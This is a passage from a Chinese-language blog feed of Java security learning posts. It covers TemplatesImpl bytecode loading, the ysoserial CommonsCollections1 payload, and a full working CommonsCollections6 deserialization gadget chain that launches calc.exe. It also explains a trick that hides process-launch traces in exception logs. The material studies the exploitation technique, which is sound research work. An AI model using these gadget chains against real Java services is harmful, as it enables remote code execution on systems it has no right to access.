class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码如上，执行过后就可成功弹出计算器，这是我们手动执行<code>newTransformer</code>触发的，我们还可以用cc链去触发，下篇文章再讲</p><p><img src="https://s2.loli.net/2022/02/28/mxHZk7ozDtqcKyu.png" alt="image.png"></p><h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><p>这种方法好像还挺重要的，而且生成的<code>bcel</code>字节码也挺奇怪的，这里是通过<code>BCEL</code>提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用<code>javac</code>命令来编译<code>java</code>文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码；有了字节码之后直接用<code>BCEL ClassLoader</code>加载就行了</p><p>这种方法我还没细学，这儿就先不写了</p><p>二月份的最后一篇文章咯，明天就是三月份啦，又是一年春天了，祝大家春天一切顺利！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Java动态加载字节码&quot;&gt;&lt;a href=&quot;#Java动态加载字节码&quot; class=&quot;headerlink&quot; title=&quot;Java动态加载字节码&quot;&gt;&lt;/a&gt;Java动态加载字节码&lt;/h1&gt;&lt;p&gt;接着学Java了，前段时间挖了挖洞，过段时间再来写写经历和体会吧，接下来我们来看看Java中动态加载字节码的方法，可以远程加载服务器上的字节码，或者本地的字节码就行&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之ysoserial中的一些操作</title>
    <link href="https://arsenetang.github.io/2022/02/15/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
    <id>https://arsenetang.github.io/2022/02/15/Java%E7%AF%87%E4%B9%8Bysoserial%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/</id>
    <published>2022-02-14T16:00:00.000Z</published>
    <updated>2022-02-14T14:44:37.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ysoserial中的一些操作"><a href="#ysoserial中的一些操作" class="headerlink" title="ysoserial中的一些操作"></a>ysoserial中的一些操作</h1><p>前面我们分析了cc1和cc6，但当我们去看<code>ysoserial</code>中时，会发现它里面有一些其它的操作，这篇文章我们就来看看这些操作的目的以及它所起到的作用</p><span id="more"></span><h2 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h2><p>我们先来看看<code>ysoserial</code>中cc1的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); </span><br><span class="line">        <span class="comment">// arm with actual transformer chain 最后才将真正具有危害的Transformer数组设置进去</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它里面封装了很多方法，很多我们在这里面是看不到的，但原理和前面我们讲的是一样的，但是它刚开始创建的那个<code>Transformer[]</code>是什么呢，里面的<code>new ConstantTransformer(1)</code>好像也没有实质性的意义，而下面那个<code>Transformer[]</code>才是我们真正需要的<code>Transformer[]</code>，那为什么我们前面要放一个假的<code>Transformer[]</code>呢？这是因为我们在使用了<code>Proxy</code>代理了<code>map</code>对象时，我们在任何地方执行<code>map</code>的方法时，都会触发<code>Proxy#invoke</code>，从而执行命令弹出计算器，这就会导致我们在<strong>调试</strong>代码的时候，有时甚至还没有执行到<code>readObject</code>就已经弹出了计算器，这是因为调试器会在下面调用一些<code>toString</code>之类的方法，导致不经意间就触发了命令</p><p>所以说<code>ysoserial</code>对此做出的处理就是最后才会将真正执行命令的<code>Transformer</code>数组设置进<code>transformerChain</code>里面去，而前面的就是假的，避免本地生成序列化流的程序执行到命令，而设置的方法就是利用反射，我们看看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reflections</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">return</span> field;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>ChainedTransformer</code>中存放<code>Transformer</code>数组的变量名就是<code>iTransformers</code>，所以说通过<code>Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</code>就把真正的<code>Transformer</code>数组设置进去了</p><p>而还有一点就是，<code>ysoserial</code>中的<code>Transformed</code>数组最后增加了一个<code>new ConstantTransformer(1)</code>，这是为什么呢？</p><p><img src="https://s2.loli.net/2022/02/14/p7ETcRrI213SB5m.png" alt="image.png"></p><p>其实这一点我也不太清楚，因为我认为无论有没有这个都是不会影响命令的正常执行的，删掉也无伤大雅，但我看p神文章，p神的猜测是可能是为了隐藏异常日志中的一些信息；因为如果这里没有<code>ConstantTransformer(1)</code>，命令进程对象将会被 <code>LazyMap#get</code> 返回，导致我们在异常信息里能看到这个特征，我们先看没有<code>ConstantTransformer(1)</code>的情况：</p><p><img src="https://s2.loli.net/2022/02/14/m71EaBHerNyou39.png" alt="image.png"></p><p>如果我们增加一个 <code>ConstantTransformer(1)</code> 在<code>TransformChain</code>的末尾，异常信息将会变成 java.lang.Integer cannot be cast to java.util.Set ，隐蔽了启动进程的日志特征：</p><p><img src="https://s2.loli.net/2022/02/14/NIGoPfUe91gOB8v.png" alt="image.png"></p><h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>而在cc6中，我们同样可以像cc1一样，首先添加一个假的<code>Transformer</code>数组，然后最后再将真正有危害的添加进去，这样可以避免许多问题，事实上<code>ysoserial</code>确实也是这么做的，而且后面也有隐藏异常日志的<code>ConstantTransformer(1)</code>操作，只不过由于我们的链子和<code>ysoserial</code>上给的不完全一样，所以说这次就不按照<code>ysoserial</code>上的分析了；但当我们加上假的<code>Transformer</code>数组，后面再变成真的之后，会发现一个问题，那就是命令并没有执行，看下面这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(faketransformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来没有任何问题，那我们点运行：</p><p><img src="https://s2.loli.net/2022/02/14/hnlJoDFaf6svqBT.png" alt="image.png"></p><p>什么也没有发生，并没有弹出计算器，这是为什么呢，来单步调试看看，看它有没有正常执行<code>transform</code>：</p><p><img src="https://s2.loli.net/2022/02/14/TxNoOWeqSXBrgHb.png" alt="image.png"></p><p>这里就出现问题了，这里<code>map.containsKey(key)</code>得为假才能进入<code>if</code>语句，但是这里已经告诉了我们，<code>super.map.containsKey(key)</code>为true，那就意味着它这儿没有正常进入<code>transform</code>中，那当然就执行不了命令了</p><p>其实在单步调试的过程中，我们可以看到，这里的问题出在<code>expMap.put(tme, &quot;valuevalue&quot;);</code>，而这个<code>put</code>方法中，又正好拥有<code>hash(key)</code>方法，那么我们回忆一下cc6的链子，这链子是不是就已经连上了，相当于本地触发了；而我们第一次传入的是<code>faketransformers</code>，这个时候<code>super.map.containsKey(key)</code>是为false的，是正常的，问题就是它进入了之后，执行了<code>super.map.put()</code>操作，这就出问题了呀，把我们key为<code>keykey</code>的对象放进去了，导致第二次，我们真正的<code>transformers</code>传进来之后，利用反序列化触发时，它就为true了，也就没办法触发了</p><p>用p神的话说，这⾥就导致<code>LazyMap</code>这个利⽤链在前面就已经被调⽤了⼀遍，因为我前⾯⽤了<code>fakeTransformers</code> ，所以此时并没有触发命令执⾏，但实际上也对我们构造Payload产⽣了影响</p><p>这里的解决方法也就很简单，只需要将这个<code>Key</code>，再从<code>outerMap</code>中移除即可： <code>outerMap.remove(&quot;keykey&quot;)</code></p><p><img src="https://s2.loli.net/2022/02/14/NS3i1ufwmVRjJY2.png" alt="image.png"></p><p>完美操作，成功，弹出计算器哈哈哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ysoserial中的一些操作&quot;&gt;&lt;a href=&quot;#ysoserial中的一些操作&quot; class=&quot;headerlink&quot; title=&quot;ysoserial中的一些操作&quot;&gt;&lt;/a&gt;ysoserial中的一些操作&lt;/h1&gt;&lt;p&gt;前面我们分析了cc1和cc6，但当我们去看&lt;code&gt;ysoserial&lt;/code&gt;中时，会发现它里面有一些其它的操作，这篇文章我们就来看看这些操作的目的以及它所起到的作用&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 6</title>
    <link href="https://arsenetang.github.io/2022/02/14/Java%E7%AF%87%E4%B9%8BCommonsCollections%206/"/>
    <id>https://arsenetang.github.io/2022/02/14/Java%E7%AF%87%E4%B9%8BCommonsCollections%206/</id>
    <published>2022-02-13T16:00:00.000Z</published>
    <updated>2022-03-07T13:59:02.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h1><p>前面的三篇文章我们介绍完了cc1的链子，但朋友们不难发现，无论是<code>TransformedMap</code>，还是<code>LazyMap</code>，在Java高版本(8u71之后)，都不能再利用了，主要问题是出在<code>AnnotationInvocationHandler</code>类中的，所以说我们这篇文章来介绍一条相对通用的链子，而这条链子就是<code>CommonsCollections6</code></p><span id="more"></span><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>我们都知道，想要触发利用链，需要找到地方去触发<code>LazyMap</code>中的<code>get</code>方法，然后后面的内容我们上一篇文章就已经说过了，所以说解决Java高版本利用问题的核心，实际上就是寻找上下文中是否还有其它调用<code>LazyMap#get()</code></p><p>这时候我们找到的类就是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>，我们来看看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.keyvalue;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.KeyValue;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^(value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在<code>getValue()</code>中调用了<code>this.map.get()</code>，然后在<code>hashCode()</code>中又调用了<code>getValue()</code>，所以说我们现在的核心就是找到哪里调用了<code>TiedMapEntry</code>中的<code>hashCode()</code></p><p>在<code>ysoserial</code>中，它是利⽤ <code>java.util.HashSet#readObject</code> 到 <code>HashMap#put()</code> 到 <code>HashMap#hash(key) </code>最后到 <code>TiedMapEntry#hashCode()</code>的</p><p>但是p神发现太麻烦了，于是找到了在<code>java.util.HashMap#readObject</code>中就可以直接调用<code>HashMap#hash()</code>，然后再调用<code>TiedMapEntry#hashCode()</code>就行了</p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>于是说我们来看看<code>HashMap</code>的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在这里我们可以看到<code>hash(key)</code>，调用了<code>hash</code>方法，再去看<code>hash</code>方法里面调用了<code>key.hashCode()</code>，成功调用了<code>hashCode</code>方法，那么只要将这个<code>key</code>赋值为我们设置好的<code>TiedMapEntry</code>对象就好了，这样就成功调用<code>TiedMapEntry#hashCode()</code>，进而触发漏洞</p><h2 